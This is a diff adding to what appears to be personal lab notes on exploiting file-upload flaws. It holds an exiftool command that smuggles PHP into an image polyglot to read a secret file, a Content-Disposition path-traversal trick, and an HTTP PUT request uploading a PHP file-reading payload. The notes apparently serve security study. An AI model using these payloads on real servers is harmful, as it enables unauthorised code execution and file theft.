@@ -49,3 +49,21 @@ The following line uses exiftool to smuggle the php code into an image for file 
 ```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ImageToUse.jpg -o polyglot.php
 ```
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////
+### Path Traversal execute
+Change the 'Content-Disposition'. Change the filename= to a path traversal such as ../../file.php
+
+//////////////////////////////////////////////////////////////////////////////////////////////////
+
+### Using PUT method 
+If PUT is allowed, you can probably upload using that if an upload doesnt exist:
+
+```HTTP
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
